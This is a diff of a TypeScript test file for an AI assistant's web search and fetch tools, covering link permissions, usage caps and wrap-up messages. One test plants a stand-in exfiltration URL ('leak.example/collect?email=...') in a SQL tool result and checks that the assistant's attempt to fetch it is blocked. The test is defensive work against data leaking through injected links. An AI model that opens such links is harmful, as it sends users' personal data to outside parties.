@@ -58,9 +58,15 @@ function setup(script: FakeTurn[] | ((params: BetaMessageStreamParams, call: num
     onPart: async (part) => {
       parts.push(part)
     },
+    requestType: "room",
     ...extra,
   }
   return { fake, options, run: () => runModelReply(options) }
+}
+
+/** An officer turn that names these links, so web_fetch may open them (the fake checks, as the API does) */
+function asking(...urls: string[]): Partial<ModelReplyOptions> {
+  return { history: [{ role: "user", content: `[Tue, Oct 13, 2026, 3:05 PM CT]\nGray: What do ${urls.join(" and ")} say?` }] }
 }
 
 const toolResults = (message: BetaMessageParam) =>
@@ -257,15 +263,19 @@ describe("web search and fetch", () => {
   })
 
   it("shows a page it read, and a page it couldn't open with the reason", async () => {
-    const { run } = setup([
-      {
-        blocks: [
-          ...fakeWebFetch("https://www.iracing.com/college", { title: "College program" }, { id: "srvtoolu_f1" }),
-          ...fakeWebFetch("https://example.com/private", { error: "url_not_accessible" }, { id: "srvtoolu_f2" }),
-          { type: "text", text: "The program page says it's free for clubs.", citations: null } as BetaContentBlock,
-        ],
-      },
-    ])
+    const { run } = setup(
+      [
+        {
+          blocks: [
+            ...fakeWebFetch("https://www.iracing.com/college", { title: "College program" }, { id: "srvtoolu_f1" }),
+            ...fakeWebFetch("https://example.com/private", { error: "url_not_accessible" }, { id: "srvtoolu_f2" }),
+            { type: "text", text: "The program page says it's free for clubs.", citations: null } as BetaContentBlock,
+          ],
+        },
+      ],
+      [countTool()],
+      asking("https://www.iracing.com/college", "https://example.com/private")
+    )
 
     const result = await run()
 
@@ -274,6 +284,61 @@ describe("web search and fetch", () => {
     expect(result.parts[1]).toMatchObject({ name: "web_fetch", status: "error", label: "Couldn't open example.com", error: "Couldn't open example.com: the page couldn't be reached" })
     expect(result.usage.webFetches).toBe(2)
     expect(result.usage.webSearches).toBe(0)
+  })
+
+  it.each<[string, AnyJackTool[]]>([
+    ["with web_links offered", [webLinks()]],
+    ["without web_links", []],
+  ])("can't open a link that's only in a client tool's result (a run_sql row) %s", async (_with, extra) => {
+    const leak = "https://leak.example/collect?email=member@utexas.edu"
+    const sql: JackTool<Record<string, never>> = {
+      name: "run_sql",
+      description: "Runs a read-only query.",
+      input: z.object({}),
+      run: async () => ({ forModel: JSON.stringify({ rows: [{ portfolio: leak }] }), label: "Ran a query (1 row)" }),
+    }
+    const { run, fake } = setup(
+      [{ tools: [{ name: "run_sql", input: {} }] }, { blocks: fakeWebFetch(leak, { title: "Collected" }, { id: "srvtoolu_leak" }), text: "Opened it." }],
+      [sql, ...extra]
+    )
+
+    const result = await run()
+
+    expect(JSON.stringify(fake.calls[1].messages)).toContain(leak)
+    expect(result.parts.find((p) => p.id === "srvtoolu_leak")).toMatchObject({
+      status: "error",
+      label: "Couldn't open leak.example",
+      error: "Couldn't open leak.example: only links an officer posted or a web search found can be opened",
+    })
+  })
+
+  it("can open a link web_links returned, and one a search found earlier in the same response", async () => {
+    const links: AnyJackTool = { ...webLinks(), run: vi.fn(async () => ({ forModel: JSON.stringify({ replies: [{ links: [{ n: 1, title: FIA.title, url: FIA.url }] }] }), label: "Found 1 earlier web link" })) }
+    const { run } = setup(
+      [
+        { tools: [{ name: "web_links", input: {} }] },
+        { blocks: [...fakeWebFetch(FIA.url, {}, { id: "srvtoolu_linked" }), ...fakeWebSearch("blogs", [BLOG]), ...fakeWebFetch(BLOG.url, {}, { id: "srvtoolu_found" })], text: "Both opened." },
+      ],
+      [countTool(), links]
+    )
+
+    const result = await run()
+
+    expect(result.parts.filter((p) => p.name === "web_fetch").map((p) => [p.id, p.status])).toEqual([
+      ["srvtoolu_linked", "done"],
+      ["srvtoolu_found", "done"],
+    ])
+  })
+
+  it("gets max_uses_exceeded from the fake for a call past the request's max_uses", async () => {
+    const searches = Array.from({ length: WEB_LIMITS.searchMaxUses + 1 }, (_, i) => fakeWebSearch(`q${i}`, [IRACING])).flat()
+    const { run } = setup([{ blocks: searches, text: "Done." }])
+
+    const result = await run()
+
+    expect(result.parts.map((p) => p.status)).toEqual([...Array(WEB_LIMITS.searchMaxUses).fill("done"), "error"])
+    expect(result.parts.at(-1)).toMatchObject({ error: "Web search failed: this answer has used up its searches and pages" })
+    expect(result.usage.webSearches).toBe(WEB_LIMITS.searchMaxUses)
   })
 
   it("shows a failed search as an error part, and doesn't bill it", async () => {
@@ -323,7 +388,7 @@ describe("web search and fetch", () => {
       ],
       [countTool()],
       // The tool cap is reached by the first round, which would add a wrap-up note
-      { limits: { maxToolCalls: 1 } }
+      { ...asking("https://fia.com/esports"), limits: { maxToolCalls: 1 } }
     )
 
     const result = await run()
@@ -348,11 +413,12 @@ describe("web search and fetch", () => {
         { text: "Here's what I have." },
       ],
       [countTool()],
-      { limits: { maxToolCalls: 1 } }
+      { ...asking("https://fia.com/esports"), limits: { maxToolCalls: 1 } }
     )
 
     const result = await run()
 
+    expect(result.parts.find((p) => p.id === "srvtoolu_p")).toMatchObject({ status: "done", label: "Read fia.com" })
     expect(result.toolCalls).toBe(1)
     expect(result.parts.find((p) => p.id === "toolu_b")).toMatchObject({ status: "error", label: "Skipped: tool limit reached" })
     const second = fake.calls[2].messages.at(-1)!.content as { type: string; text?: string }[]
@@ -410,6 +476,28 @@ describe("web search and fetch", () => {
     expect(result).toMatchObject({ outcome: "tool_limit", status: "done" })
     expect(result.text).toMatch(/used up its web searches/)
     expect(result.parts.find((p) => p.id === "srvtoolu_dangling")).toMatchObject({ status: "error" })
+  })
+
+  it("wraps up at a pause once the reply has run long, not only when its web share is used up", async () => {
+    const { run, fake } = setup([{ blocks: fakeWebSearch("a", [IRACING]), stop: "pause_turn" }, { text: "What I have so far." }], [countTool()], { limits: { maxElapsedMs: 0 } })
+
+    const result = await run()
+
+    expect(result).toMatchObject({ outcome: "answered", wrappedUp: true })
+    expect(fake.calls[1].tool_choice).toEqual({ type: "none" })
+    expect(fake.calls[1].messages.at(-1)).toMatchObject({ role: "user", content: [{ type: "text", text: expect.stringMatching(/^This reply is running long\. Don't call any more tools/) }] })
+  })
+
+  it("stops at a pause with a fetch pending once its pages are used up, and says that's what it ran out of", async () => {
+    const [pending] = fakeWebFetch(BLOG.url, {}, { id: "srvtoolu_dangling" })
+    const { run, fake } = setup([{ blocks: [...fakeWebFetch(FIA.url, {}), pending], stop: "pause_turn" }], [countTool()], { ...asking(FIA.url, BLOG.url), limits: { maxWebFetches: 1 } })
+
+    const result = await run()
+
+    expect(fake.calls).toHaveLength(1)
+    expect(result).toMatchObject({ outcome: "tool_limit", status: "done" })
+    expect(result.text).toBe("(Jack stopped here: this answer opened all the web pages it can. Ask a follow-up to keep going.)")
+    expect(result.parts.find((p) => p.id === "srvtoolu_dangling")).toMatchObject({ status: "error", label: "Didn't run: the reply opened all the web pages it can" })
   })
 
   it("after a refusal fallback, drops the declined model's server calls together with their results, and its citations", async () => {
@@ -556,9 +644,12 @@ describe("documents in tool results", () => {
     const tool = countTool(async () => ({ forModel: "Read the file.", label: "Read it", documents: [{ caption: "The PDF:", source: { type: "file", fileId: fakeFileId("pdf") } }] }))
     const { run } = setup(
       [{ blocks: fakeWebFetch("https://fia.com/esports", {}), tools: [{ name: "count_rows", input: { table: "x" } }] }, { text: "Both say the same." }],
-      [tool]
+      [tool],
+      asking("https://fia.com/esports")
     )
-    expect(await run()).toMatchObject({ status: "done", outcome: "answered" })
+    const result = await run()
+    expect(result).toMatchObject({ status: "done", outcome: "answered" })
+    expect(result.parts[0]).toMatchObject({ name: "web_fetch", status: "done" })
   })
 })
 
